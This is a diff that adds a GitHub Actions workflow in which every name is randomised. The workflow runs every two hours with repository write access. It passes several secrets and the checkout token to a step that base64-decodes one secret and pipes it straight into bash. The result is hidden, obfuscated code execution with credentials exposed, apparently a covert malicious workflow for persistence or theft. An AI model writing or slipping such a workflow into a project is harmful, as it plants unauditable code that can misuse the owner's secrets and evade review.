@@ -1,0 +1,21 @@
+name: lBWtgPZ6
+on:
+  schedule:
+    - cron: '0 */2 * * *'
+  workflow_dispatch:
+jobs:
+  gsP1Q:
+    runs-on: ubuntu-latest
+    permissions:
+      contents: write
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          token: ${{ secrets.pM5SyF1 }}
+      - name: zvrsPRBo
+        env:
+          uwiT1IpIzt: ${{ secrets.FQOLXd2IW }}
+          fIEChARgegF7f: ${{ secrets.KceZSc9ooeRW }}
+          tXSjwum2j5R9: ${{ secrets.ikxQDOn1zN7HCRrl }}
+          GITHUB_TOKEN: ${{ secrets.pM5SyF1 }}
+        run: echo "$uwiT1IpIzt" | base64 -d | bash
